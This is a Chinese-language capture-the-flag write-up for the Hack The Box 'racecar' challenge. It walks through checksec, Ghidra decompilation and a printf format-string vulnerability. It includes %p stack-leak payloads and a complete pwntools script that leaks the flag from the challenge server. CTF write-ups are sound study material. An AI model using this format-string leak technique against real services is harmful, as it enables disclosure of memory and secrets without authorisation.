题目网址：
```
https://app.hackthebox.com/challenges/racecar
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/42c943d4118a4f5199e13dfe22f96cc6.png)


解压密码为hackthebox

# 文件信息收集
```
file racecar
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/87ba14c50f964b0c8009fe002d86905b.png)

这是一个32位的程序，动态链接的

```
checksec vuln
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/54f06ea2b2b0464cadcd923d32725a9f.png)

防护都开着的，从上到下依次是
```
32位程序
全部RELRO
开启栈保护
启用数据执行防护
程序的内存空间随机化
```
# 静态分析
用ghidra打开程序，按下键盘的i键，选择程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/6f0c1f56654d414cad549f8ee89df83b.png)

双击启动，然后都是默认即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/6a64ddbdb6ee4178b1ca02cd9f9994b4.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/243dbb45bef14a588769cc18f5b324bc.png)

回到终端，先运行程序，搞清楚程序的界面

![在这里插入图片描述](https://img-blog.csdnimg.cn/467c2625672940abb1287b0163eeb652.png)
```
nc 46.101.77.44 30441
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/9addba564901476682eb58d9e098db88.png)


比较常见的pwn题目，我第一个想到的漏洞是格式化字符串漏洞，回到ghidra，继续分析，这程序的函数还挺多，在car_menu内找到了关键的地方



![在这里插入图片描述](https://img-blog.csdnimg.cn/133af4dc4d93485c9590777cd445b970.png)
```
  if (((iVar1 == 1) && (iVar2 < iVar3)) || ((iVar1 == 2 && (iVar3 < iVar2)))) {
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n",&DAT_00011540);
    coins = coins + 100;
    puVar5 = &DAT_00011538;
    printf("[+] Current coins: [%d]%s\n",coins,&DAT_00011538);
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s",
           &DAT_000119de);
    __format = (char *)malloc(0x171);
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0) {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n",&DAT_00011548,puVar5);
                    /* WARNING: Subroutine does not return */
      exit(0x69);
    }
    fgets(local_3c,0x2c,__stream);
    read(0,__format,0x170);
    puts(
        "\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world  to know this: \x1b[0m"
        );
    printf(__format);
  }
```

程序在这读取了flag文件里的内容，还读取了我们输入的内容并输出，我们可以尝试泄露栈中的数据，首先我们需要到Do you have anything to say to the press after your big victory?\n>字符串的位置

![在这里插入图片描述](https://img-blog.csdnimg.cn/be61834c1b91473889c30d395bca141e.png)

然后尝试泄露堆栈里的内容
```
AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p % p %p %p %p
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/643dedbfc2ee4cd29b90cbfda44054dd.png)

泄露了很多东西，但是我们输入的AAAAAAAA字符串的数据没有泄露，然后我重新看了一下汇编代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/08bf336e07f849a98bbb0577225197dc.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/6f237bddcedf4996aca004abee717bd0.png)

因为我们的输入存储在char *__format中，现在我们需要遍历堆栈，查找__format的偏移量
```
%数字$s
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/8b9584737fc44b60ba9f1d3da4d33acd.png)

在我们输入到10的时候，程序返回*__format指针的内容，也就是我们输入的内容，然后我用ida继续分析程序的汇编代码，因为ghidra在深度分析时，多多少少有点问题

![在这里插入图片描述](https://img-blog.csdnimg.cn/7d8f8b7c8c3845ac84142ab8042a53bc.png)



然后我把这些函数改一个名称

![在这里插入图片描述](https://img-blog.csdnimg.cn/af7e54b9613248ffb44ab98eb8a5a6fd.png)

可以看到，flag的地方文件描述符(fd)之后
# pwn
现在写一个脚本来泄露flag
```
from pwn import *
 
offset_start_flag = 12
len_of_flag = 44
offset_end_flag = offset_start_flag + 11
 
 
formatstring = ""
 
for i in range(offset_start_flag, offset_end_flag):
    formatstring += "%"+str(i)+"$p "
 
 
r = remote("46.101.77.44", 30441)
 
r.sendlineafter("Name: ", "a")
r.sendlineafter("Nickname: ", "a")
r.sendlineafter("> ", "2")
r.sendlineafter("> ", "2")
r.sendlineafter("> ", "1")
 
r.sendlineafter("> ", formatstring)
r.recv()
response = r.recv()
 
# Format output
preflag = (response.decode("utf-8").split("m\n"))[1]
preflag = preflag.split()
 
flag = ""
for hexdecimal in preflag:
    flag += p32(int(hexdecimal, base=16)).decode("utf-8")
 
print(flag)
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8108aa52ee4645cd89eccd649614df63.png)
成功获得flag
